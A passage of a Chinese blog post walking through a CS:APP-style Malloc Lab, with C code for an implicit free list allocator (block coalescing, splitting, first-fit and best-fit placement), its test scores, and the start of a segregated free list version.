<li>由于要求块双字对齐，所以块大小就总是 8 的倍数，低 3 位总是为 0，因而，我们只需要利用头部和脚部的高 29 位存储块的大小，剩下 3 位的最低位来指明这个块是否空闲，000 为空闲，001 为已分配</li>
</ul>
<p>为什么既设置头部又设置尾部呢？这是为了能够以常数时间来进行块的合并。无论是与下一块还是与上一块合并，都可以通过他们的头部或尾部得知块大小，从而定位整个块，避免了从头遍历链表。</p>
<p>空闲块怎么组织呢？如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220409214914000.png" alt="image-20220409214914000"></p>
<p>堆有两个特殊的标记：</p>
<ul>
<li>序言块：8 个字节，由一个头部和一个脚部组成</li>
<li>结尾块：大小为 0 的头部</li>
</ul>
<p>为了消除合并空闲块时边界的考虑，将序言块和结尾块的分配位均设置为已分配。为了保证双字对齐，在序言块的前面还设置了 4 个字节作为填充。</p>
<p>根据上述结构，可以定义一些方便操作的宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 头部/脚部的大小 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4</span></span><br><span class="line"><span class="comment">/* 双字 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 扩展堆时的默认大小 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置头部和脚部的值, 块大小+分配位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读写指针p的位置 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) ((*(unsigned int *)(p)) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从头部或脚部获取大小或分配位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 给定有效载荷指针, 找到头部和脚部 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp) ((char*)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 给定有效载荷指针, 找到前一块或下一块 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char*)(bp) + GET_SIZE(((char*)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char*)(bp) - GET_SIZE(((char*)(bp) - DSIZE)))</span></span><br></pre></td></tr></table></figure>

<h2 id="合并与分割"><a href="#合并与分割" class="headerlink" title="合并与分割"></a>合并与分割</h2><p>先<strong>初始化堆</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 申请四个字节空间 */</span></span><br><span class="line">    <span class="keyword">if</span>((heap_list = mem_sbrk(<span class="number">4</span>*WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_list, <span class="number">0</span>);                              <span class="comment">/* 对齐 */</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 序言块和结尾块均设置为已分配, 方便考虑边界情况</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PUT(heap_list + (<span class="number">1</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>));     <span class="comment">/* 填充序言块 */</span></span><br><span class="line">    PUT(heap_list + (<span class="number">2</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>));     <span class="comment">/* 填充序言块 */</span></span><br><span class="line">    PUT(heap_list + (<span class="number">3</span>*WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));         <span class="comment">/* 结尾块 */</span></span><br><span class="line"></span><br><span class="line">    heap_list += (<span class="number">2</span>*WSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 扩展空闲空间 */</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点在<strong>扩展堆</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 扩展heap, 传入的是字节数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* bp总是指向有效载荷 */</span></span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="comment">/* 根据传入字节数奇偶, 考虑对齐 */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words+<span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 分配 */</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 设置头部和脚部 */</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">/* 空闲块头 */</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">/* 空闲块脚 */</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));   <span class="comment">/* 片的新结尾块 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断相邻块是否是空闲块, 进行合并 */</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>扩展堆每次在原始堆的尾部申请空间，<code>mem_sbrk</code>函数返回指向旧堆尾部的指针，因此，可以直接将原始堆的尾部位置设置新空闲块的头部。</p>
<p>接下来就是 <strong>free</strong>，设置一下头部和脚部即可，free 完后注意合并空闲块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptr==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分割空闲块</strong>要考虑剩下的空间是否足够放置头部和脚部</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 分离空闲块</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 判断是否能够分离空闲块 */</span></span><br><span class="line">    <span class="keyword">if</span>((csize - asize) &gt;= <span class="number">2</span>*DSIZE) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 设置为填充 */</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>合并</strong>要分四种情况进行处理：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220409214718603.png" alt="image-20220409214718603"></p>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 合并空闲块</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));     <span class="comment">/* 前一块大小 */</span></span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));     <span class="comment">/* 后一块大小 */</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));                       <span class="comment">/* 当前块大小 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 四种情况：前后都不空, 前不空后空, 前空后不空, 前后都空</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* 前后都不空 */</span></span><br><span class="line">    <span class="keyword">if</span>(prev_alloc &amp;&amp; next_alloc)&#123;</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 前不空后空 */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123;</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));  <span class="comment">//增加当前块大小</span></span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">//先修改头</span></span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">//根据头部中的大小来定位尾部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 前空后不空 */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123;</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));  <span class="comment">//增加当前块大小</span></span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);                     <span class="comment">//注意指针要变</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 都空 */</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));  <span class="comment">//增加当前块大小</span></span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="放置策略"><a href="#放置策略" class="headerlink" title="放置策略"></a>放置策略</h2><p><strong>首次适配</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *bp;</span><br><span class="line">    <span class="keyword">for</span>(bp = heap_list; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))&#123;</span><br><span class="line">        <span class="keyword">if</span>((GET_SIZE(HDRP(bp)) &gt;= asize) &amp;&amp; (!GET_ALLOC(HDRP(bp))))&#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>最佳适配</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">best_fit</span><span class="params">(<span class="type">size_t</span> asize)</span>&#123;</span><br><span class="line">	<span class="type">void</span> *bp;</span><br><span class="line">    <span class="type">void</span> *best_bp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">size_t</span> min_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(bp = heap_list; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))&#123;</span><br><span class="line">        <span class="keyword">if</span>((GET_SIZE(HDRP(bp)) &gt;= asize) &amp;&amp; (!GET_ALLOC(HDRP(bp))))&#123;</span><br><span class="line">            <span class="keyword">if</span>(min_size ==<span class="number">0</span> || min_size &gt; GET_SIZE(HDRP(bp)))&#123;</span><br><span class="line">                min_size = GET_SIZE(HDRP(bp));</span><br><span class="line">                best_bp = bp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> best_bp;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="分配块"><a href="#分配块" class="headerlink" title="分配块"></a>分配块</h2><p>最后就是主体部分 mm_malloc 函数，对申请的空间大小按 8 对齐进行舍入，然后根据放置策略查找有无合适的空闲块，如果没有则申请扩展堆</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= DSIZE)</span><br><span class="line">        asize = <span class="number">2</span>*DSIZE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE<span class="number">-1</span>)) / DSIZE);</span><br><span class="line">    <span class="comment">/* 寻找合适的空闲块 */</span></span><br><span class="line">    <span class="keyword">if</span>((bp = best_fit(asize)) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 找不到则扩展堆 */</span></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span>((bp = extend_heap(extendsize/WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试结果及分数"><a href="#测试结果及分数" class="headerlink" title="测试结果及分数"></a>测试结果及分数</h2><p>使用首次适配：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220410110534700.png" alt="image-20220410110534700"></p>
<p>使用最佳适配：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220410110627090.png" alt="image-20220410110627090"></p>
<p>最佳适配的分数反而更低一些，原因是虽然空间利用率提高了，但是时间增加太多了。</p>
<h1 id="Segregated-Free-Lists实现"><a href="#Segregated-Free-Lists实现" class="headerlink" title="Segregated Free Lists实现"></a>Segregated Free Lists实现</h1><p>尝试课本推荐的 Segregated Fit（分离适配）方式实现</p>
<h2 id="结构设置"><a href="#结构设置" class="headerlink" title="结构设置"></a>结构设置</h2><p>空闲块设置如图结构：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220410173414229.png" alt="image-20220410173414229"></p>
<p>每一个块都有一个头部和脚部，在有效载荷中又分别存放着指向前一个块和后一个块的指针。所以每个空闲块最小为 16 个字节</p>
<p>堆的结构也是在原来的 Implict Free List 中进行略微改进，如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220410181117284.png" alt="image-20220410181117284"></p>
<p>相当于在原来的堆结构中增加了两点：</p>
<ul>
<li>堆结构的前面放置不同等价类空闲块的头指针</li>
<li>每个空闲块的有效载荷分出一部分作为前驱和后继指针</li>
</ul>
<p>也就是说，我们的这个做法与 Implicit Free List 非常相似，只不过多维护了 n 个链表</p>
<p>根据链表的结构特点，增加了几个操作宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 读写指针p的位置 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned int *)(p))</span></span><br><span class="line"><span class="comment">/* 给定序号，找到链表头节点位置 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_HEAD(num) ((unsigned int *)(long)(GET(heap_list + WSIZE * num)))</span></span><br><span class="line"><span class="comment">/* 给定bp,找到前驱和后继 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PRE(bp) ((unsigned int *)(long)(GET(bp)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUC(bp) ((unsigned int *)(long)(GET((unsigned int *)bp + 1)))</span></span><br></pre></td></tr></table></figure>

<p>这里指针转换很繁杂，操作完后，一定要将其强制转换为<code>unsigned int *</code>，这样，返回的指针加 1 相当于加 32 个字节，便于定位块中其他部位。</p>
<h2 id="大小类设置"><a href="#大小类设置" class="headerlink" title="大小类设置"></a>大小类设置</h2><p>由上述结构，每个空闲块最小也要 16 个字节，理论上来说，设置的大小类越多，时间性能要越好，因而设置 20 个大小类：${ 16}, { 17 \sim 32}, { 33 \sim 64},\cdots , { 2049 \sim 4096}, { 4097 \sim 9194 }, \cdots, { 2^{22}+1 \sim \infty }$</p>
<h2 id="结构建立"><a href="#结构建立" class="headerlink" title="结构建立"></a>结构建立</h2><p>先看初始化函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 申请四个字节空间 */</span></span><br><span class="line">    <span class="keyword">if</span>((heap_list = mem_sbrk((<span class="number">4</span>+CLASS_SIZE)*WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* 初始化20个大小类头指针 */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; CLASS_SIZE; i++)&#123;</span><br><span class="line">        PUT(heap_list + i*WSIZE, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 对齐 */</span></span><br><span class="line">    PUT(heap_list + CLASS_SIZE * WSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 序言块和结尾块均设置为已分配, 方便考虑边界情况</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PUT(heap_list + ((<span class="number">1</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="number">1</span>));     <span class="comment">/* 填充序言块 */</span></span><br><span class="line">    PUT(heap_list + ((<span class="number">2</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="number">1</span>));     <span class="comment">/* 填充序言块 */</span></span><br><span class="line">    PUT(heap_list + ((<span class="number">3</span> + CLASS_SIZE)*WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));         <span class="comment">/* 结尾块 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 扩展空闲空间 */</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>见上面画的结构图，在序言块之前放置 20 个空闲链表头指针，剩下的结构与原来完全一样。而扩展堆是在结尾块后进行扩展，因而扩展块操作也与原来相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 扩展heap, 传入的是字节数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* bp总是指向有效载荷 */</span></span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="comment">/* 根据传入字节数奇偶, 考虑对齐 */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words+<span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 分配 */</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 设置头部和脚部 */</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">/* 空闲块头 */</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">/* 空闲块脚 */</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));   <span class="comment">/* 片的新结尾块 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断相邻块是否是空闲块, 进行合并 */</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="维护链表"><a href="#维护链表" class="headerlink" title="维护链表"></a>维护链表</h2><p>在知道要请求块的大小后，我们要先根据大小定位到相应大小类的头结点：</p>
